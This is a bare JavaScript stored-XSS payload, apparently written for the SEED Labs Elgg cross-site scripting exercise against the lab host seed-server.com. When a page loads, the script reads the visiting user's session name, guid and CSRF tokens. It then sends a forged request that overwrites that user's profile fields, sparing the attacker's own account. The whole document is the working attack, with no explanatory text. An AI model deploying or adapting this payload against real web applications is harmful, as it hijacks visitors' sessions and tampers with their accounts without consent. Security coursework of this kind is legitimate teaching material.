<script type="text/javascript">
   

window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    // and Security Token __elgg_token
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    // Construct the content of your URL.
    var userName = elgg.session.user.username;
    var userGuid = elgg.session.user.guid;
    var myId = "1905051";
    var myRandomText = "pretty";
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    var content = "__elgg_token=" + token + "&__elgg_ts=" + ts + "&name=" + userName + "&description=" + myId + "&accesslevel[description]=1&briefdescription=" + myRandomText + "&accesslevel[briefdescription]=1&location=" + myRandomText + "&accesslevel[location]=1&interests=" + myRandomText + "&accesslevel[interests]=1&skills=" + myRandomText + "&accesslevel[skills]=1&contactemail=" + myRandomText + "&accesslevel[contactemail]=1&phone=" + myRandomText + "&accesslevel[phone]=1&mobile=" + myRandomText + "&accesslevel[mobile]=1&website=" + myRandomText + "&accesslevel[website]=1&twitter=" + myRandomText + "&accesslevel[twitter]=1&guid=" + userGuid;

    if (userGuid != 59) {
         //console.log("Dhuksi if e");
        // Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        // Ajax.setRequestHeader("Host", "www.seed-server.com"); // Host is denied
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
        //console.log("done");
    }
};


</script>